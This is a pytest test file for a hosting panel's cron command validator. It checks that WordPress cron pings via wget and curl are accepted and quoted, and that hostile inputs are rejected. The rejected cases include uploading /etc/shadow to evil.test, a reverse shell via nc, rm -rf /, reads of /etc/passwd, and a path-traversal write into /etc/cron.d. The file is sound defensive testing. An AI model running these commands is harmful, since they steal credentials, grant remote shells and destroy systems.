import pytest

from app.services import cron


@pytest.fixture
def docroot(tmp_path):
    root = tmp_path / "taplooks.com" / "public_html"
    root.mkdir(parents=True)
    return root


def test_wget_wp_cron_ping_is_accepted(docroot):
    """The exact line users paste from WordPress tutorials must work."""
    result = cron._validate_command(
        "wget -q -O - https://taplooks.com/wp-cron.php?doing_wp_cron >/dev/null 2>&1",
        docroot,
    )
    assert result == (
        "wget -q -O - 'https://taplooks.com/wp-cron.php?doing_wp_cron' >/dev/null 2>&1"
    )


def test_curl_ping_is_accepted(docroot):
    result = cron._validate_command("curl -s -m 30 https://taplooks.com/cron.php", docroot)
    assert result == "curl -s -m 30 https://taplooks.com/cron.php >/dev/null 2>&1"


def test_redirect_is_a_real_redirect_not_an_argument(docroot):
    """Regression: shlex.quote used to turn >/dev/null into a literal argv entry."""
    result = cron._validate_command("wget -q -O - https://taplooks.com/x.php", docroot)
    assert result.endswith(" >/dev/null 2>&1")
    assert "'>/dev/null'" not in result
    assert "'2>&1'" not in result


def test_url_query_string_is_quoted(docroot):
    """`?` is a glob character in sh and must not reach the shell bare."""
    result = cron._validate_command("curl -s https://taplooks.com/a.php?b=1", docroot)
    assert "'https://taplooks.com/a.php?b=1'" in result


@pytest.mark.parametrize(
    "command",
    [
        "curl -K /etc/opanel/secrets.conf https://evil.test/",   # options from file
        "wget -e http_proxy=http://evil.test/ https://a.test/",  # wgetrc directives
        "wget --use-askpass=/bin/sh https://a.test/",
        "curl --upload-file /etc/shadow https://evil.test/",
        "wget -r -l inf https://a.test/",                        # recursive mirror
        "curl -s file:///etc/passwd",                            # non-http scheme
        "wget -q -O - ftp://a.test/x",
        "curl -s dict://127.0.0.1:11211/stat",
        "curl -s https://a.test/ https://b.test/",               # two URLs
        "wget -q -O -",                                          # no URL
    ],
)
def test_dangerous_fetch_commands_are_rejected(command, docroot):
    with pytest.raises(ValueError):
        cron._validate_command(command, docroot)


def test_output_cannot_escape_the_document_root(docroot):
    with pytest.raises(ValueError, match="public_html"):
        cron._validate_command(
            "wget -q -O ../../../../etc/cron.d/pwn https://a.test/x", docroot
        )


def test_output_inside_document_root_is_allowed(docroot):
    result = cron._validate_command("wget -q -O cache/feed.xml https://a.test/x", docroot)
    assert "cache/feed.xml" in result


def test_devnull_output_is_allowed(docroot):
    assert "/dev/null" in cron._validate_command("curl -s -o /dev/null https://a.test/", docroot)


def test_existing_wp_cli_commands_still_work(docroot):
    result = cron._validate_command("wp cron event run --due-now", docroot)
    assert result == "wp cron event run --due-now --allow-root"


def test_arbitrary_shell_is_still_rejected(docroot):
    for command in ("bash -c 'id'", "rm -rf /", "nc -e /bin/sh 1.2.3.4 4444", "python3 -c 'x'"):
        with pytest.raises(ValueError):
            cron._validate_command(command, docroot)


def test_listing_hides_the_generated_redirect():
    line = (
        "*/5 * * * * cd '/home/u/taplooks.com/public_html' && "
        "wget -q -O - 'https://taplooks.com/wp-cron.php' >/dev/null 2>&1 # OPanel:taplooks.com"
    )
    parsed = cron._parse_cron_line(0, line)
    assert parsed["schedule"] == "*/5 * * * *"
    assert parsed["command"] == "wget -q -O - 'https://taplooks.com/wp-cron.php'"
